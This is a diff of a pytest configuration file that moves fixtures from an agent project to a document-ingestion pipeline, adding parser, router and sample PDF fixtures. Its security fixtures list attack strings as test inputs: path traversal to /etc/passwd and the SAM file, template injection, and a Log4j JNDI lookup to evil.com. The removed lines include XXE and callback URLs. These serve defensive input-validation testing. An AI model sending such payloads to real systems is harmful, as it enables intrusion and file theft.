@@ -1,19 +1,32 @@
 """
-Simplified pytest configuration for PromptCraft testing.
-Automatically sets coverage contexts based on test directory structure
-to match codecov.yaml flags for consistency.
+pytest configuration for data_ingestor testing.
+
+Provides comprehensive test fixtures for document processing, parsing,
+and routing functionality. Automatically sets coverage contexts based on
+test directory structure.
 """
 
 import json
 import os
 import time
+from datetime import UTC, datetime
+from pathlib import Path
 from typing import Any
 
 import pytest
 
-from src.agents.base_agent import BaseAgent
-from src.agents.models import AgentConfig, AgentInput, AgentOutput
-from src.agents.registry import AgentRegistry
+from data_ingestor.core.base import BaseParser
+from data_ingestor.core.config import Settings
+from data_ingestor.core.models import (
+    Document,
+    DocumentElement,
+    DocumentFormat,
+    ElementMetadata,
+    ElementType,
+    ParserResult,
+    ProcessingStatus,
+)
+from data_ingestor.pipeline.router import DocumentRouter, ParserRegistry
 
 
 def pytest_runtest_setup(item):
@@ -23,20 +36,14 @@ def pytest_runtest_setup(item):
 
     if "/tests/unit/" in test_path:
         context = "unit"
-    elif "/tests/auth/" in test_path:
-        context = "auth"
     elif "/tests/integration/" in test_path:
         context = "integration"
     elif "/tests/security/" in test_path:
         context = "security"
     elif "/tests/performance/" in test_path:
         context = "performance"
-    elif "/tests/stress/" in test_path:
-        context = "stress"
     elif "/tests/contract/" in test_path:
         context = "contract"
-    elif "/tests/examples/" in test_path:
-        context = "examples"
     else:
         context = "other"
 
@@ -44,21 +51,14 @@ def pytest_runtest_setup(item):
     os.environ["COVERAGE_CONTEXT"] = context
 
 
-# Pytest markers that match codecov flags
-pytest_plugins = ["pytest_plugins.coverage_hook_plugin"]
-
-
 def pytest_configure(config):
     """Register markers that match codecov flags."""
     markers = [
         "unit: Unit tests (isolated, fast)",
-        "auth: Authentication and authorization tests",
         "integration: Integration tests (cross-component)",
         "security: Security-focused tests",
         "performance: Performance and load tests",
-        "stress: Stress and resource tests",
         "contract: Contract tests for external services",
-        "examples: Example and demo tests",
     ]
 
     for marker in markers:
@@ -79,80 +79,325 @@ def coverage_contexts():
     print(f"\nCoverage contexts used: {sorted(contexts)}")
 
 
-# Agent Testing Fixtures
-# These fixtures support comprehensive agent system testing across unit, integration, and security tests.
+# =============================================================================
+# Document Model Fixtures
+# =============================================================================
 
 
 @pytest.fixture
-def fresh_agent_registry():
+def sample_document() -> Document:
     """
-    Provide a clean AgentRegistry instance for each test.
+    Provide a sample Document instance for testing.
 
-    This fixture ensures complete test isolation by creating a fresh registry
-    instance and clearing it after each test to prevent state leakage.
-
-    Yields:
-        AgentRegistry: Fresh registry instance for the test
-    """
-    registry = AgentRegistry()
-    yield registry
-    # Cleanup: clear all registrations to prevent state leakage
-    registry.clear()
-
-
-@pytest.fixture
-def mock_agent_class():
-    """
-    Provide a mock BaseAgent class that passes all validation requirements.
-
-    This fixture creates a fully compliant BaseAgent implementation that can be used
-    for testing registry functionality without requiring real agent logic.
+    Creates a comprehensive Document with realistic metadata, elements,
+    and processing status for thorough testing of document functionality.
 
     Returns:
-        Type[BaseAgent]: Mock agent class suitable for testing
+        Document: Sample document with comprehensive data
+    """
+    return Document(
+        document_id="test-doc-123",
+        source_path=None,  # Use None to avoid path validation issues in tests
+        format=DocumentFormat.PDF,
+        status=ProcessingStatus.PENDING,
+        created_at=datetime(2025, 1, 1, 12, 0, 0, tzinfo=UTC),
+        updated_at=datetime(2025, 1, 1, 12, 0, 0, tzinfo=UTC),
+        metadata={
+            "title": "Test Document",
+            "author": "Test Author",
+            "pages": 10,
+            "language": "en",
+        },
+    )
+
+
+@pytest.fixture
+def sample_document_element() -> DocumentElement:
+    """
+    Provide a sample DocumentElement instance for testing.
+
+    Creates a comprehensive element with metadata for testing
+    element processing and manipulation.
+
+    Returns:
+        DocumentElement: Sample element with metadata
+    """
+    return DocumentElement(
+        element_type=ElementType.NARRATIVE_TEXT,
+        content="This is a sample paragraph for testing.",
+        metadata=ElementMetadata(
+            page_number=1,
+            coordinates=(10.0, 20.0, 100.0, 40.0),
+            filename="test_document.pdf",
+        ),
+    )
+
+
+@pytest.fixture
+def sample_parser_result() -> ParserResult:
+    """
+    Provide a sample ParserResult instance for testing.
+
+    Creates a successful parser result with elements and metadata
+    for testing parser output handling.
+
+    Returns:
+        ParserResult: Sample parser result
+    """
+    elements = [
+        DocumentElement(
+            element_type=ElementType.TITLE,
+            content="Test Title",
+            metadata=ElementMetadata(page_number=1, category_depth=1),
+        ),
+        DocumentElement(
+            element_type=ElementType.NARRATIVE_TEXT,
+            content="Test paragraph content.",
+            metadata=ElementMetadata(page_number=1),
+        ),
+    ]
+
+    return ParserResult(
+        success=True,
+        elements=elements,
+        raw_content="Test Title\n\nTest paragraph content.",
+        metadata={"pages": 1, "extraction_method": "test"},
+        parser_name="TestParser",
+        processing_time=0.5,
+    )
+
+
+# =============================================================================
+# Parser Fixtures
+# =============================================================================
+
+
+@pytest.fixture
+def mock_parser_class():
+    """
+    Provide a mock BaseParser class for testing.
+
+    Creates a fully functional mock parser that can be used to test
+    parser registration, routing, and fallback mechanisms.
+
+    Returns:
+        Type[BaseParser]: Mock parser class suitable for testing
     """
 
-    class MockTestAgent(BaseAgent):
-        """Mock agent class for testing purposes."""
+    class MockTestParser(BaseParser):
+        """Mock parser class for testing purposes."""
 
-        def __init__(self, config):
+        def __init__(self, config: dict[str, Any] | None = None):
             super().__init__(config)
-            self.test_call_count = 0
+            self.name = config.get("name", "MockParser") if config else "MockParser"
+            self.parse_call_count = 0
+            self.should_fail = False
 
-        async def execute(self, agent_input):
-            """Mock execute method that returns a valid response."""
-            self.test_call_count += 1
-            return AgentOutput(
-                content=f"Mock response {self.test_call_count}",
-                confidence=0.9,
+        def supports_format(self, document_format: DocumentFormat) -> bool:
+            """Mock format support - supports PDF by default."""
+            return document_format == DocumentFormat.PDF
+
+        def parse(self, document: Document) -> ParserResult:
+            """Mock parse method."""
+            self.parse_call_count += 1
+
+            if self.should_fail:
+                return ParserResult(
+                    success=False,
+                    parser_name=self.name,
+                    processing_time=0.1,
+                    error_message="Mock parsing failed",
+                )
+
+            elements = [
+                DocumentElement(
+                    element_type=ElementType.NARRATIVE_TEXT,
+                    content=f"Mock parsed content from {self.name}",
+                    metadata=ElementMetadata(page_number=1),
+                ),
+            ]
+
+            return ParserResult(
+                success=True,
+                elements=elements,
+                parser_name=self.name,
                 processing_time=0.1,
-                agent_id=self.agent_id,
-                request_id=agent_input.request_id,
+                metadata={"mock": True},
             )
 
-        def get_capabilities(self):
-            """Mock capabilities for testing."""
-            return {
-                "input_types": ["text"],
-                "output_types": ["text"],
-                "mock_agent": True,
-                "test_mode": True,
-            }
+        def health_check(self) -> bool:
+            """Mock health check - always healthy unless configured otherwise."""
+            return not self.should_fail
 
-    return MockTestAgent
+    return MockTestParser
+
+
+@pytest.fixture
+def mock_parser(mock_parser_class):
+    """
+    Provide a mock parser instance for testing.
+
+    Returns:
+        BaseParser: Mock parser instance
+    """
+    return mock_parser_class()
+
+
+# =============================================================================
+# Router Fixtures
+# =============================================================================
+
+
+@pytest.fixture
+def parser_registry():
+    """
+    Provide a fresh ParserRegistry instance for testing.
+
+    Ensures test isolation by creating a new registry for each test.
+
+    Returns:
+        ParserRegistry: Fresh parser registry
+    """
+    return ParserRegistry()
+
+
+@pytest.fixture
+def document_router():
+    """
+    Provide a fresh DocumentRouter instance for testing.
+
+    Returns:
+        DocumentRouter: Fresh document router with default settings
+    """
+    return DocumentRouter(settings=Settings())
+
+
+@pytest.fixture
+def configured_router(document_router, mock_parser_class):
+    """
+    Provide a DocumentRouter with registered mock parsers.
+
+    Useful for testing routing logic without actual parser dependencies.
+
+    Returns:
+        DocumentRouter: Router with mock parsers registered
+    """
+    # Create and register primary parser
+    primary_parser = mock_parser_class({"name": "PrimaryParser", "priority": 10})
+    document_router.parser_registry.register(primary_parser, [DocumentFormat.PDF])
+
+    # Create and register fallback parser
+    fallback_parser = mock_parser_class({"name": "FallbackParser", "priority": 20})
+    document_router.parser_registry.register(fallback_parser, [DocumentFormat.PDF])
+
+    return document_router
+
+
+# =============================================================================
+# File System Fixtures
+# =============================================================================
+
+
+@pytest.fixture
+def temp_test_file(tmp_path: Path) -> Path:
+    """
+    Create a temporary test PDF file.
+
+    Creates a minimal valid PDF file for testing file-based operations.
+
+    Args:
+        tmp_path: Pytest's built-in tmp_path fixture
+
+    Returns:
+        Path: Path to temporary PDF file
+    """
+    # Minimal valid PDF content
+    pdf_content = b"""%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 4 0 R
+>>
+endobj
+4 0 obj
+<<
+/Length 44
+>>
+stream
+BT
+/F1 12 Tf
+100 700 Td
+(Test PDF) Tj
+ET
+endstream
+endobj
+xref
+0 5
+0000000000 65535 f
+0000000009 00000 n
+0000000058 00000 n
+0000000115 00000 n
+0000000214 00000 n
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+316
+%%EOF
+"""
+    test_file = tmp_path / "test_document.pdf"
+    test_file.write_bytes(pdf_content)
+    return test_file
+
+
+@pytest.fixture
+def temp_text_file(tmp_path: Path) -> Path:
+    """
+    Create a temporary text file for testing.
+
+    Args:
+        tmp_path: Pytest's built-in tmp_path fixture
+
+    Returns:
+        Path: Path to temporary text file
+    """
+    test_file = tmp_path / "test_document.txt"
+    test_file.write_text("This is a test document.\nIt has multiple lines.\n")
+    return test_file
+
+
+# =============================================================================
+# Security Testing Fixtures
+# =============================================================================
 
 
 @pytest.fixture
 def security_test_inputs():
     """
-    Provide a comprehensive list of potentially malicious inputs for security testing.
+    Provide comprehensive malicious inputs for security testing.
 
-    This fixture includes various attack vectors commonly used in security testing,
-    based on OWASP guidelines and common injection techniques. These inputs help
-    validate that the system handles malicious content safely.
+    Based on OWASP guidelines and common injection techniques to validate
+    that the system handles malicious content safely.
 
     Returns:
-        List[str]: List of potentially malicious input strings for security testing
+        List[str]: List of potentially malicious input strings
     """
     # Based on OWASP Top 10 and common injection techniques
     return [
@@ -175,14 +420,9 @@ def security_test_inputs():
         "../../../etc/passwd",
         "..\\..\\..\\windows\\system32\\config\\sam",
         # Template Injection attempts
-        "49",
+        "{{7*7}}",
         "${7*7}",
         "#{7*7}",
-        # LDAP Injection attempts
-        "*)(uid=*",
-        "admin)(&(password=*))",
-        # XML/XXE attempts
-        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
         # Buffer Overflow attempts (long strings)
         "A" * 10000,
         "B" * 100000,
@@ -190,30 +430,17 @@ def security_test_inputs():
         "%00",  # Null byte
         "%2e%2e%2f",  # URL encoded ../
         "\\x00\\x01\\x02\\x03",  # Binary data
-        "\\r\\n\\r\\n",  # CRLF injection
         # Unicode and encoding edge cases
-        "𝓤𝓷𝓲𝓬𝓸𝓭𝓮",  # Unicode mathematical script  # noqa: RUF001
+        "𝓤𝓷𝓲𝓬𝓸𝓭𝓮",  # Unicode mathematical script
         "🚀🔥💻",  # Emojis
-        "\\ufeff",  # BOM character
-        # Empty and whitespace edge cases
-        "",  # Empty string
-        " ",  # Single space
-        "\\t\\n\\r",  # Whitespace characters
-        None,  # None value (converted to string)
         # Large payloads
         json.dumps({"key": "value" * 1000}),  # Large JSON
-        # Protocol-specific attacks
-        "file:///etc/passwd",
-        "http://malicious.com/callback",
-        "ftp://anonymous@malicious.com/",
-        # Deserialization attacks
-        'O:8:"stdClass":0:{}',  # PHP object
-        "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAA",  # Java serialized
     ]
 
 
+# =============================================================================
 # Performance Testing Fixtures
-# These fixtures support comprehensive performance and edge case testing across unit, integration, and security tests.
+# =============================================================================
 
 
 class PerformanceMetrics:
@@ -255,10 +482,9 @@ class PerformanceMetrics:
 @pytest.fixture
 def performance_metrics() -> PerformanceMetrics:
     """
-    Provide a PerformanceMetrics instance for performance boundary tests.
+    Provide a PerformanceMetrics instance for performance testing.
 
-    Default max_duration is set to 5.0 seconds to accommodate various
-    data sizes in boundary condition testing.
+    Default max_duration is set to 5.0 seconds.
 
     Returns:
         PerformanceMetrics: Timing utility with configurable thresholds
@@ -266,25 +492,184 @@ def performance_metrics() -> PerformanceMetrics:
     return PerformanceMetrics(max_duration=5.0)
 
 
+# =============================================================================
+# Test Data and Validation Fixtures
+# =============================================================================
+
+
+@pytest.fixture(scope="session")
+def test_data_dir() -> Path:
+    """
+    Provide the test data directory path.
+
+    Session-scoped for efficiency since the directory location doesn't change.
+
+    Returns:
+        Path: Path to test data directory
+    """
+    return Path("data/test_pdfs")
+
+
+@pytest.fixture(scope="session")
+def validation_dir(test_data_dir: Path) -> Path:
+    """
+    Provide the validation data directory path.
+
+    Returns:
+        Path: Path to validation directory containing expected outputs
+    """
+    return test_data_dir / "validation"
+
+
+@pytest.fixture
+def validation_loader(validation_dir: Path):
+    """
+    Factory fixture for loading validation data files.
+
+    Provides a callable that loads JSON validation files for test PDFs.
+
+    Args:
+        validation_dir: Path to validation directory
+
+    Returns:
+        Callable[[str], dict]: Function to load validation data by PDF name
+    """
+    def load(pdf_name: str) -> dict[str, Any]:
+        """Load validation data for a PDF file."""
+        validation_file = validation_dir / f"{pdf_name}.json"
+        if not validation_file.exists():
+            raise FileNotFoundError(f"Validation file not found: {validation_file}")
+        with open(validation_file) as f:
+            return json.load(f)
+    return load
+
+
+@pytest.fixture
+def sample_realistic_document() -> Document:
+    """
+    Provide a realistic Document with multiple sections for testing.
+
+    Creates a document structure similar to a research paper with:
+    - Title and abstract
+    - Multiple sections with headings
+    - Paragraphs, tables, and formulas
+    - Realistic metadata
+
+    Returns:
+        Document: Realistic test document
+    """
+    doc = Document(
+        document_id="realistic-test-doc",
+        source_path="research_paper.pdf",
+        format=DocumentFormat.PDF,
+    )
+
+    doc.elements = [
+        # Title
+        DocumentElement(
+            element_type=ElementType.TITLE,
+            content="Machine Learning in Document Processing",
+            metadata=ElementMetadata(page_number=1, category_depth=1),
+        ),
+        # Abstract
+        DocumentElement(
+            element_type=ElementType.HEADING,
+            content="Abstract",
+            metadata=ElementMetadata(page_number=1, category_depth=2),
+        ),
+        DocumentElement(
+            element_type=ElementType.PARAGRAPH,
+            content="This paper presents a comprehensive study of machine learning techniques "
+                   "applied to document processing. We demonstrate significant improvements "
+                   "in accuracy and performance across multiple benchmark datasets.",
+            metadata=ElementMetadata(page_number=1),
+        ),
+        # Introduction
+        DocumentElement(
+            element_type=ElementType.HEADING,
+            content="1. Introduction",
+            metadata=ElementMetadata(page_number=1, category_depth=2),
+        ),
+        DocumentElement(
+            element_type=ElementType.PARAGRAPH,
+            content="Natural language processing has seen remarkable advances in recent years. "
+                   "Deep learning models have revolutionized how we approach text understanding.",
+            metadata=ElementMetadata(page_number=1),
+        ),
+        # Methods
+        DocumentElement(
+            element_type=ElementType.HEADING,
+            content="2. Methods",
+            metadata=ElementMetadata(page_number=2, category_depth=2),
+        ),
+        DocumentElement(
+            element_type=ElementType.PARAGRAPH,
+            content="We employed a multi-stage pipeline for our experiments.",
+            metadata=ElementMetadata(page_number=2),
+        ),
+        # Table
+        DocumentElement(
+            element_type=ElementType.TABLE,
+            content="Model | Accuracy | F1-Score\\nBERT | 0.92 | 0.89\\nGPT | 0.94 | 0.91",
+            metadata=ElementMetadata(page_number=2, text_as_html="<table>...</table>"),
+        ),
+        # Results
+        DocumentElement(
+            element_type=ElementType.HEADING,
+            content="3. Results",
+            metadata=ElementMetadata(page_number=3, category_depth=2),
+        ),
+        DocumentElement(
+            element_type=ElementType.PARAGRAPH,
+            content="Our experiments demonstrate consistent improvements across all metrics.",
+            metadata=ElementMetadata(page_number=3),
+        ),
+    ]
+
+    return doc
+
+
+@pytest.fixture
+def sample_pdf_paths(test_data_dir: Path) -> dict[str, Path]:
+    """
+    Provide paths to sample PDF files for integration testing.
+
+    Returns:
+        dict[str, Path]: Dictionary mapping PDF names to paths
+    """
+    return {
+        "simple_text": test_data_dir / "01_simple_text.pdf",
+        "multipage": test_data_dir / "02_multipage_document.pdf",
+        "formatted": test_data_dir / "03_formatted_text.pdf",
+        "tables": test_data_dir / "04_tabular_data.pdf",
+        "mixed": test_data_dir / "05_mixed_content.pdf",
+        "complex": test_data_dir / "06_complex_layout.pdf",
+    }
+
+
+# =============================================================================
+# Edge Case Testing Fixtures
+# =============================================================================
+
+
 @pytest.fixture(
     params=[
         None,  # Null configuration
         {},  # Empty configuration
         {"invalid": "config"},  # Invalid configuration structure
-        {"app_name": ""},  # Empty app name
-        {"app_name": None},  # Null app name
-        {"app_name": "a" * 1000},  # Very long app name
-        {"app_name": "\\x00\\x01"},  # Binary data in app name
-        {"app_name": "🚀🔥💯"},  # Unicode in app name
-        {"valid": "config"},  # Valid baseline configuration
+        {"max_file_size_mb": 0},  # Zero size limit
+        {"max_file_size_mb": -1},  # Negative size limit
+        {"max_file_size_mb": 1000000},  # Very large size limit
+        {"priority": "invalid"},  # Invalid priority type
+        {"priority": -1},  # Negative priority
     ],
 )
 def config_edge_cases(request) -> Any:
     """
-    Provide parametrized configuration edge cases for validation testing.
+    Provide parametrized configuration edge cases.
 
     Covers critical edge cases including None values, empty configurations,
-    invalid structures, malformed data, and security-focused edge cases.
+    invalid structures, and boundary values.
 
     Returns:
         Any: Configuration value for edge case testing
@@ -309,7 +694,7 @@ def config_edge_cases(request) -> Any:
         "../../../etc/passwd",  # Path traversal
         "${jndi:ldap://evil.com/a}",  # Log4j-style injection
         "'; DROP TABLE users; --",  # SQL injection
-        "49",  # Template injection
+        "{{7*7}}",  # Template injection
         0,  # Integer zero
         -1,  # Negative integer
         3.14,  # Float
@@ -321,106 +706,12 @@ def config_edge_cases(request) -> Any:
 )
 def edge_case_inputs(request) -> Any:
     """
-    Provide parametrized edge case inputs for input validation testing.
+    Provide parametrized edge case inputs for validation testing.
 
     Comprehensive collection including boundary values, type variations,
-    security attack vectors, and malformed data to ensure robust
-    input handling across all components.
+    security attack vectors, and malformed data.
 
     Returns:
         Any: Input value for edge case testing
     """
     return request.param
-
-
-# Agent Models Testing Fixtures
-# These fixtures support comprehensive agent model testing for validation, serialization, and edge cases.
-
-
-@pytest.fixture
-def sample_agent_input():
-    """
-    Provide a sample AgentInput instance for testing.
-
-    This fixture creates a comprehensive AgentInput example that includes all optional
-    fields populated with realistic values for thorough testing of model functionality.
-
-    Returns:
-        AgentInput: Sample agent input with comprehensive data
-    """
-    return AgentInput(
-        content="This is a test input for the agent",
-        context={"language": "python", "framework": "fastapi", "content_type": "text", "priority": "normal"},
-        config_overrides={"max_tokens": 500, "temperature": 0.7, "timeout": 30.0},
-    )
-
-
-@pytest.fixture
-def sample_agent_output():
-    """
-    Provide a sample AgentOutput instance for testing.
-
-    This fixture creates a comprehensive AgentOutput example that includes all fields
-    populated with realistic values for thorough testing of model functionality.
-
-    Returns:
-        AgentOutput: Sample agent output with comprehensive data
-    """
-    return AgentOutput(
-        content="This is a test output from the agent",
-        metadata={"analysis_type": "security", "rules_checked": 10, "issues_found": 0, "processing_stage": "complete"},
-        confidence=0.95,
-        processing_time=1.234,
-        agent_id="test_agent",
-        request_id="test-request-123",
-    )
-
-
-@pytest.fixture
-def sample_agent_config_model():
-    """
-    Provide a sample AgentConfig instance for testing.
-
-    This fixture creates a comprehensive AgentConfig example that includes all fields
-    populated with realistic values for thorough testing of model functionality.
-
-    Returns:
-        AgentConfig: Sample agent config with comprehensive data
-    """
-    return AgentConfig(
-        agent_id="test_agent",
-        name="Test Agent",
-        description="A test agent for unit testing",
-        config={"max_tokens": 1000, "temperature": 0.8, "model": "gpt-4", "features": ["analysis", "generation"]},
-        enabled=True,
-    )
-
-
-@pytest.fixture
-def sample_agent_config(sample_agent_config_model):
-    """
-    Provide a sample agent config as dict for BaseAgent testing.
-
-    This fixture converts the Pydantic model to a dict format that BaseAgent.__init__
-    expects (dict[str, Any]). It maintains single source of truth by deriving from
-    the sample_agent_config_model fixture.
-
-    This fixture resolves the mismatch between test expectations and BaseAgent API:
-    - Tests expect: dict config for BaseAgent(config: dict[str, Any])
-    - Previous fixture provided: Pydantic model
-
-    Returns:
-        dict[str, Any]: Agent configuration as dict compatible with BaseAgent
-    """
-    # Convert Pydantic model to dict using Pydantic v2 syntax
-    base_config = sample_agent_config_model.model_dump()
-
-    # Extract the nested config and merge with top-level fields for BaseAgent compatibility
-    return {
-        "agent_id": base_config["agent_id"],
-        "name": base_config["name"],
-        "description": base_config["description"],
-        "enabled": base_config["enabled"],
-        # Flatten the nested config for BaseAgent compatibility
-        **base_config["config"],
-    }
